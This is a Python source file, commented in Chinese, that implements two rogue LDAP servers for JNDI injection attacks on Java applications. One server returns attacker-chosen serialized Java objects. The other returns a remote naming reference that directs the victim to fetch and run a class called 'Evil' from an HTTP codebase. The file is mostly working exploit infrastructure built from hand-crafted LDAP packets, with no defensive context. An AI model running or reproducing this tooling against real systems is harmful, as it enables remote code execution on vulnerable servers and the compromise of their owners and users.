import socket
from threading import Thread


# 构造报文用的函数
def addAttribute(attrName, attrValue):
    msg = b""
    if len(attrValue) >= 0xFF:
        len1 = len(attrValue).to_bytes(2, byteorder="big")
        msg = b"\x04\x82" + len1 + attrValue + msg
    else:
        len1 = len(attrValue).to_bytes(1, byteorder="big")
        msg = b"\x04" + len1 + attrValue + msg
    if len(msg) >= 0xFF:
        len2 = len(msg).to_bytes(2, byteorder="big")
        msg = b"\x31\x82" + len2 + msg
    else:
        len2 = len(msg).to_bytes(1, byteorder="big")
        msg = b"\x31" + len2 + msg
    len3 = len(attrName).to_bytes(1, byteorder="big")
    msg = b"\x04" + len3 + attrName + msg
    if len(msg) >= 0xFF:
        len4 = len(msg).to_bytes(2, byteorder="big")
        msg = b"\x30\x82" + len4 + msg
    else:
        len4 = len(msg).to_bytes(1, byteorder="big")
        msg = b"\x30" + len4 + msg
    return msg


class LdapSerialized():
    """
    返回序列化数据的ldap服务器
    """

    def __init__(self, serobj: bytes, ip: str = "0.0.0.0", port: int = 1389):
        self.serobj = serobj
        self.ip = ip
        self.port = port

    def serve(self):
        s = socket.socket()
        s.bind((self.ip, self.port))
        s.listen(5)
        while True:
            # 接受客户端
            conn, addr = s.accept()
            # 接受JNDI请求
            conn.recv(14)
            # 返回确认信息
            conn.send(b"\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00")
            # 接收客户端请求的一个字节
            conn.recv(1)
            # 再接收一个字节，这个字节标志了客户端请求报文剩下的长度
            len1 = conn.recv(1)  # 收到的是字节串，要转化成数
            # 把字节串转化成数
            len1 = ord(len1)
            # 接收剩下的请求报文
            data = conn.recv(len1)
            # 获取字符串的长度
            len2 = data[6]  # 字节串里面截取出来自动变成数
            # 保存请求的类名称
            classname = data[7:7 + len2]
            # 构造报文
            serobj = self.serobj
            msg1 = addAttribute(b"javaSerializedData", serobj)
            msg2 = addAttribute(b"javaClassName", b"java.lang.String")
            msg = msg2 + msg1
            len3 = len(msg).to_bytes(2, byteorder="big")
            msg = b"\x04" + len2.to_bytes(1, byteorder="big") + classname + b"\x30\x82" + len3 + msg
            len4 = len(msg).to_bytes(2, byteorder="big")
            msg = b"\x02\x01\x02\x64\x82" + len4 + msg
            len5 = len(msg).to_bytes(2, byteorder="big")
            msg = b"\x30\x82" + len5 + msg
            # 发送
            conn.send(msg)
            # 结束通信，这是必须的
            conn.send(b"\x30\x0c\x02\x01\x02\x65\x07\x0a\x01\x00\x04\x00\x04\x00")
            conn.recv(36)

    def run(self):
        self.thread = Thread(target=self.serve)
        self.thread.start()


class LdapRemoteRef():
    """
    返回remote reference的ldap服务器
    其中参数javaFactory是放置在http服务器上的类名
    """

    def __init__(self, javaCodeBase: str = "http://127.0.0.1:8088/", javaFactory: str = "Evil",
                 javaClassName: str = "java.lang.String", ip: str = "0.0.0.0", port: int = 1389):
        self.javaCodeBase = javaCodeBase.encode()
        self.javaFactory = javaFactory.encode()
        self.ip = ip
        self.port = port
        self.javaClassName = javaClassName.encode()

    def __serve(self):
        s = socket.socket()
        s.bind((self.ip, self.port))
        s.listen(5)
        while True:
            # 接受客户端
            conn, addr = s.accept()
            # 接受JNDI请求
            conn.recv(14)
            # 返回确认信息
            conn.send(b"\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00")
            # 接收客户端请求的一个字节
            conn.recv(1)
            # 再接收一个字节，这个字节标志了客户端请求报文剩下的长度
            len1 = conn.recv(1)  # 收到的是字节串，要转化成数
            # 把字节串转化成数
            len1 = ord(len1)
            # 接收剩下的请求报文
            data = conn.recv(len1)
            # 获取字符串的长度
            len2 = data[6]  # 字节串里面截取出来自动变成数
            # 保存请求的类名称
            classname = data[7:7 + len2]
            # 构造报文
            msg1 = addAttribute(b"javaFactory", self.javaFactory)
            msg2 = addAttribute(b"objectClass", b"javaNamingReference")
            msg3 = addAttribute(b"javaCodeBase", self.javaCodeBase)
            msg4 = addAttribute(b"javaClassName", self.javaClassName)
            msg = msg4 + msg3 + msg2 + msg1
            len3 = len(msg).to_bytes(1, byteorder="big")
            msg = b"\x04" + len2.to_bytes(1, byteorder="big") + classname + b"\x30\x81" + len3 + msg
            len4 = len(msg).to_bytes(1, byteorder="big")
            msg = b"\x02\x01\x02\x64\x81" + len4 + msg
            len5 = len(msg).to_bytes(1, byteorder="big")
            msg = b"\x30\x81" + len5 + msg
            # 发送
            conn.send(msg)
            # 结束通信，这是必须的
            conn.send(b"\x30\x0c\x02\x01\x02\x65\x07\x0a\x01\x00\x04\x00\x04\x00")
            conn.recv(36)

    def run(self):
        """
        使用这个启动服务器
        """
        self.thread = Thread(target=self.__serve)
        self.thread.start()
